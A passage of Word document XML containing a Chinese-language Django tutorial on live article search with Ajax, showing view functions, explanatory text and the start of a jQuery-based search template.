        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BAC183F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534AB1C4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleListView(ListView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562D512D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    queryset = Article.objects.filter(status='p').order_by('-pub_date')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4E6FA3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    paginate_by = 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C5B610" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D9EE6A9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def article_search(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB49B2D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if request.method == 'GET':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACD36C2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = SearchForm(request.GET)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486A5652" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if form.is_valid():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="376E1866" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            keyword = form.cleaned_data.get("keyword")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57150F6E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            if keyword:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECA9296" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                article_list = Article.objects.filter(title__icontains=keyword)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B5C128" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                return render(request, 'blog/search.html', {'form': form, 'article_list': article_list})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38DC75B9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3116F909" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = SearchForm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513FDC23" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37D6EA99" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'blog/search.html', {'form': form, 'article_list': False, })</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB37F64" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38326672" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def ajax_search(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5641ED6C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if request.method == 'GET':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7A525D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        keyword = request.GET.get('keyword', None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A636398" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if keyword:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C4579B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            count = Article.objects.filter(title__icontains=keyword).count()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA5D52F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            data = {'count': count, }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F166CBC" w14:textId="3B61AFE6" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return JsonResponse(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5663A1" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们着重看下ajax_search是如何工作的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F38F0BA" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当搜索页面上ajax的通过GET发送请求时，服务器获取ajax发送过来的keyword。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7677F638" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果keyword不为空，服务器查询文章标题包含有keyword的文章数量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732DBCD9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>服务器将字典{‘count': count }转化为Json数据格式并返回给ajax所在页面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB2D06F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32F3190D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板blog/search.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3314E2B0" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们的模板blog/search.html代码如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1538795F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193DA040" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;h3&gt;Django Ajax</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>实时搜索文章</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759D06C0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C8D26CC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;form method="get" action=""&gt;{% csrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B994D76" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {{ form }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA2C30B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;input type="submit" value="Search" /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A20D4FA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482BFD4F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E36A22" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BCAD127" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;div id="result"&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B864F7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37F3BEE1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;script src="https://code.jquery.com/jquery-3.1.0.min.js"&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0784C297" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7614B7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    $("#id_keyword").bind('input propertychange', function() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26FC81EB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      var keyword = $(this).val();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6DBA64" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BE2E5FD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      $.ajax({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1EB4C0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        url: '/blog/ajax/search/',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16DAAFFB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        data: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B44AFC7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">          'keyword': keyword</w:t>
      </w:r>
    </w:p>
